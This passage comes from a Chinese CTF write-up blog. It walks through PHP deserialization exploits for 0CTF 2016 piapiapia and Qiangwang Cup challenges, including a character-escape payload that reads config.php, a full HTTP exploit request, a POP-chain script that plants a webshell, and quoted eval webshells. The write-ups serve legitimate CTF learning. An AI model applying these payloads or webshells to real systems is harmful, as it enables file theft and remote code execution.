implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">	<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他的函数都是一些insert与update之类的函数，并没有太多漏洞，而filter函数中的逻辑主要是将<code>select,insert,update,delete,where</code>四个关键词替换为<code>hacker</code>，把单引号和反斜杠过滤为<code>_</code>。</p>
<p>User类继承了Mysql类，其中函数传入的变量值都是基于Filter函数的过滤，也没有宽字节，所以应该几乎莫得注入漏洞。</p>
<p>接着审计又发现了反序列化的点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure>

<p>发现如果$profile可控的话，我实际上就可以通过构造<code>$profile[&#39;photo&#39;]</code>来读取任意我们想要读取的文件，跟进$profile</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$profile=$user-&gt;show_profile($username);</span><br></pre></td></tr></table></figure>

<p>跟进<code>show_profile</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">	$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">	$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">	$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">	<span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>感觉挺完美的…通过传入的<code>username</code>取出序列化值，接着审计一下序列化字符串是怎么生成的，跟进<code>serialize</code>函数,在<code>update.php</code>中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">	$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">	<span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">	$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">	<span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">	move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">	$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">	$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">	$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">	$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">	$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个nickname的过滤是有问题的</p>
<p><a href="https://imgchr.com/i/V09bXF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/07/V09bXF.md.png" alt="V09bXF.md.png"></a></p>
<p>首先他和前两个POST变量的过滤方法就不一样，而且我们知道<code>preg_match</code>与<code>strlen</code>遇到数组是直接返回false的，所以我们只要将nickname传为数组就可以绕过这个过滤。<strong>而上面的两个方法还是很安全的，比如，如果返回false的话经过非之后还是1依然被过滤掉</strong>。</p>
<p>这里也就是出现了我们可以构造任意<code>nickname</code>的值,但是接下来怎么利用呢….，看到下面有一个<code>update_profile</code>,跟进看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">	$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">	$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">	$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现<code>$username</code>与<code>$new_profile</code>都被filter函数又过滤了一遍，又看了几遍…依然找不到攻击点，不太清楚怎么能吧photo中的值换成<code>config.php</code></p>
<h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><p>审计了很多遍，最终的攻击链应该如下</p>
<p><a href="https://imgchr.com/i/V0VlRA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/07/V0VlRA.md.png" alt="V0VlRA.md.png"></a></p>
<p>而且还可以任意构造<code>nickname</code>的值,注入点应该不能有，因为filter函数过滤的还是很严禁的</p>
<p>后来看wp才发现了几个细节问题。</p>
<h4 id="filter函数中存在这样的一个问题"><a href="#filter函数中存在这样的一个问题" class="headerlink" title="filter函数中存在这样的一个问题"></a>filter函数中存在这样的一个问题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br></pre></td></tr></table></figure>
<p>where是和其他操作字符不同的，where是五个字符，而其他是六个字符，如果直接将where替换为hacker就会造成这样的一个问题</p>
<p>自己的测试代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">    $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;  <span class="comment">//   /'|\\/</span></span><br><span class="line">    $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">    $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">    $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($_POST[<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">echo</span> filter(serialize($profile));</span><br></pre></td></tr></table></figure>

<p>传入<code>nickname=where</code></p>
<p><a href="https://imgchr.com/i/V0ZAYQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/07/V0ZAYQ.md.png" alt="V0ZAYQ.md.png"></a></p>
<p>实际上hacker是6个字符，而这里只显示了5个字符，就会造成如下情况</p>
<p><code>a:1{i:0;s:5:”where”;}</code>—&gt;<code>a:1{i:0;s:5:”hacher”;}</code>就会导致r没有被读到，导致反序列化出错，最终逃逸字符</p>
<h4 id="第二个小细节"><a href="#第二个小细节" class="headerlink" title="第二个小细节"></a>第二个小细节</h4><p>对于反序列化来讲，反序列化一个完整的序列化语句之后的字符串是无效的，如下：</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;s:5:"phone";s:11:"12345678901";&#125;xxxxxxxxx'</span>));</span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;s:5:"phone";s:11:"12345678901";&#125;'</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"phone"</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"12345678901"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"phone"</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"12345678901"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到之后的字符串对于反序列化一个完整的序列化字符串是无效的。</p>
<h4 id="反序列化中的闭合"><a href="#反序列化中的闭合" class="headerlink" title="反序列化中的闭合"></a>反序列化中的闭合</h4><p>其实反序列化的中闭合主要是依靠字符数量来判断是否闭合，举几个例子</p>
<p>我们提交<code>nickname[]=666&quot;;}s:5:&quot;photo&quot;;s:10:config.php</code>，生成反序列化字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:10:&quot;1378627291&quot;;s:5:&quot;email&quot;;s:9:&quot;li@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:33:&quot;666&quot;;&#125;s:5:&quot;photo&quot;;s:10:config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;6512bd43d9caa6e02c990b0a82652dca&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>对于上面的字符串如果我们稍作改动的话</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:10:&quot;1378627291&quot;;s:5:&quot;email&quot;;s:9:&quot;li@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;666&quot;;&#125;s:5:&quot;photo&quot;;s:10:config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;6512bd43d9caa6e02c990b0a82652dca&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>通过将33修改为3导致”闭合”,使<code>s:5:&quot;photo&quot;;s:10:config.php&quot;</code>逃逸出来，而后面的<code>s:5:&quot;photo&quot;;s:39:&quot;upload/6512bd43d9caa6e02c990b0a82652dca&quot;;}</code>则失去了作用，最终取出的是config.php中的内容。</p>
<h4 id="逃逸构造"><a href="#逃逸构造" class="headerlink" title="逃逸构造"></a>逃逸构造</h4><p>之前我们有发现过如果在<code>nickname</code>中构造<code>where</code>的话在filter函数的过滤下，会使得<code>where</code>变成<code>hacker</code>最终导致只能读取到<code>hacke</code>,使得r逃逸掉，同样的话如果我们构造<code>where&quot;;}s:5:&quot;photo&quot;;s:10:config.php</code>序列化的字符串经过filter函数的处理后where依然会变成hacker，所以这次逃逸掉的字符是p,我们的目的是要逃逸掉<code>;}s:5:&quot;photo&quot;;s:10:config.php</code>,所以也就是构造31个where，使得语句逃逸，构成完整的序列化语句，payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br></pre></td></tr></table></figure>

<p>抓包填入，获得flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;update.php HTTP&#x2F;1.1</span><br><span class="line">Host: web1.buuoj.cn</span><br><span class="line">Content-Length: 18526</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;web1.buuoj.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryGQFB45N3zJ7jFxhh</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;76.0.3809.12 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Referer: http:&#x2F;&#x2F;web1.buuoj.cn&#x2F;update.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: PHPSESSID&#x3D;24b0eee38566bbde249eed75c52838ec</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGQFB45N3zJ7jFxhh</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;phone&quot;</span><br><span class="line"></span><br><span class="line">13846518712</span><br><span class="line">------WebKitFormBoundaryGQFB45N3zJ7jFxhh</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;email&quot;</span><br><span class="line"></span><br><span class="line">eee@qq.com</span><br><span class="line">------WebKitFormBoundaryGQFB45N3zJ7jFxhh</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;nickname[]&quot;</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br><span class="line">------WebKitFormBoundaryGQFB45N3zJ7jFxhh</span><br></pre></td></tr></table></figure>

<p>在profile.php文件中查看，base64解码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">'qwertyuiop'</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">'challenges'</span>;</span><br><span class="line">$flag = <span class="string">'flag&#123;ju55bi2bpeffeoy45l21w93h7c015rb4&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/07/2016-0CTF-piapiapia-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6/" data-id="ckabsu37d0000kkvrbe65f1zr" class="article-share-link" data-share="baidu" data-title="2016-0CTF-piapiapia(反序列化逃逸字符)">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/07/2016-0CTF-piapiapia-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-强网杯部分wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/04/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/" class="article-date">
  <time datetime="2019-06-04T01:18:00.000Z" itemprop="datePublished">2019-06-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/04/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/">强网杯部分wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>强网杯与物理实验撞了还是很难受的..没发现upload源码泄露更难受，下面是对其他题目的一些复盘</p>
<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>主要后台逻辑文件共有<code>Register.php,login.php,Profile.php.Index.php</code>这四个文件</p>
<p>先理清一下文件的代码逻辑</p>
<p>register的函数逻辑</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbaxb9o7j31350hwtaz.jpg" alt="img"></p>
<p>首先调用__construct进行new Index(),从Index中调用login_check进行登陆检测，login_check函数代码如下：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbdsms7hj30u40ajdge.jpg" alt="img"></p>
<p>可以看到函数逻辑为将目前<strong>User处的反序列化数据与数据库中的进行对比，如果不同则直接返回0</strong>，这里就是我们要利用的一个点——–<strong>unserialize</strong></p>
<p>接着去找一下所有文件中危险魔术方法操作</p>
<p><strong>register处的__construct</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbkopahoj30rm0fbt9p.jpg" alt="img"></p>
<p><strong>register处destruct</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbgnza1jj30gt075mx5.jpg" alt="img"></p>
<p><strong>Profile中的<strong>call与</strong>get方法</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbin6dtvj30ju0cyweq.jpg" alt="img"></p>
<p><strong>这四个魔术方法足以形成一个pop链，去调用任意函数方法</strong>，解析如下:</p>
<p><strong>当<strong>destruct中的$this-&gt;checker指向的index方法如果在$this-&gt;checker这个类不存在的话，那么就会触发</strong>call方法，在<strong>call方法中逻辑:调用$this-&gt;{$name}，但是如果此类中仍然不存在$this-&gt;${name}变量的话,那么就会再一次触发</strong>get魔术方法，去返回expect数组中对应调用此$this-&gt;name的值，然后__call再次去调用expect数组中对应的值，所以只要我们构造好expect数组中index对应值，就可以实现执行任意方法的操作，将值写成方法的名字，便可调用任意方法。</strong></p>
<p>这里还要说明一点:为什么这个反序列化数据看起来的作用域是所有类的，看到所有类中是基本都有一个<strong>login_check</strong>函数的，所以反序列化的数据对应的作用域即是所有类，所以可以进行构造反序列化自由调用。</p>
<h4 id="既然可以执行任意方法函数了，下面来找一下危险函数方法"><a href="#既然可以执行任意方法函数了，下面来找一下危险函数方法" class="headerlink" title="既然可以执行任意方法函数了，下面来找一下危险函数方法"></a>既然可以执行任意方法函数了，下面来找一下危险函数方法</h4><p>在Profile类中存在<strong>upload-img危险函数</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbwpsd9kj30wx0ke765.jpg" alt="img"></p>
<p>可以看到有一个<strong>危险操作copy函数，如果我们控制了filename与filename_tmp就可以成功生成自己的webshell了</strong></p>
<p>这里在upload_img函数中有几个点需要去绕过一下：</p>
<ul>
<li>login_check函数：在反序列化时通过this-&gt;checker实例化Index类进行login_check调用检查，这里比较好绕过，<strong>可以不用管$this-&gt;checker(因为反序列化不会去调用__construct方法，还可以将$this&gt;checker赋值为0或者false,都可以实现绕过。</strong></li>
<li>第二个if，反序列化的时候不上传文件即可绕过。</li>
<li>第三个，就是之前所说的文件头伪造绕过的</li>
<li>赋值<strong>$this-&gt;ext为1</strong>,进入copy函数生成图片马</li>
</ul>
<p>下面为逻辑图</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kd2tuaeyj30t60dsdh6.jpg" alt="img"></p>
<p>这样我们就可以很轻松的写出反序列化构造代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Register</span><br><span class="line">&#123;</span><br><span class="line">    public $registed&#x3D;0;</span><br><span class="line">    public $checker;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checker&#x3D;new Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Profile</span><br><span class="line">&#123;</span><br><span class="line">    public $except&#x3D;array(&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;);</span><br><span class="line">    public $filename_tmp&#x3D;&#39;..&#x2F;public&#x2F;upload&#x2F;bc9c0f21801e3928b868149bfb65e408&#x2F;cd3d1cc6e477b590d1b89a6ee805808e.png&#39;;</span><br><span class="line">    public $filename&#x3D;&#39;..&#x2F;public&#x2F;upload&#x2F;lihuaiqiu.php&#39;;</span><br><span class="line">    public $ext&#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">$v&#x3D;new Register();</span><br><span class="line">echo base64_encode(serialize($v));</span><br></pre></td></tr></table></figure>

<p>将生成的base64编码放进cookie中，得到webshell</p>
<p><a href="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kdbu25hrj31590fnabf.jpg" target="_blank" rel="noopener">https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kdbu25hrj31590fnabf.jpg</a></p>
<h3 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h3><p>开始还以为是源码混淆Orz，其实是一个webshell检测。</p>
<p>下载下来先看一看各个文件的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">'koCDtumdL'</span>] = <span class="string">' '</span>;</span><br><span class="line"><span class="keyword">echo</span> `&#123;$_GET[<span class="string">'koCDtumdL'</span>]&#125;`;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">'I29lh7cQy'</span>] = <span class="string">' '</span>;</span><br><span class="line">$XnG = <span class="string">'HuyJp9'</span>;</span><br><span class="line">$VMu0e9 = <span class="string">'IcO5xu3U'</span>;</span><br><span class="line">$Hoe5A = <span class="string">'PJG62i'</span>;</span><br><span class="line">$ubz = <span class="keyword">new</span> stdClass();</span><br><span class="line">$ubz-&gt;aJ8 = <span class="string">'gGUGkqZC'</span>;</span><br><span class="line">$ubz-&gt;tv79bhFX = <span class="string">'Nqnz9sBp75'</span>;</span><br><span class="line">$ubz-&gt;qm5PiB = <span class="string">'N9D'</span>;</span><br><span class="line">$CEOXM1OK = <span class="string">'JxK'</span>;</span><br><span class="line">$je3_P4w = <span class="string">'xdWIprx5TX'</span>;</span><br><span class="line">$VMu0e9 = $_GET[<span class="string">'xUX5t3zfVyCTro'</span>] ?? <span class="string">' '</span>;</span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">"n0w_vOdIh5wEQhC"</span>))&#123;</span><br><span class="line">    n0w_vOdIh5wEQhC($Hoe5A);</span><br><span class="line">&#125;</span><br><span class="line">var_dump($je3_P4w);</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'I29lh7cQy'</span>] ?? <span class="string">' '</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到大部分文件中，虽然有一句话木马，但是都是一些障眼法，在一句话木马的上方，是有代码将传入的值置空的。</p>
<p>本地搭建进行代码爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">partern=re.compile(<span class="string">r'(_GET\[\')(.*)(\'\])'</span>)</span><br><span class="line">url=<span class="string">'http://127.0.0.1/src'</span></span><br><span 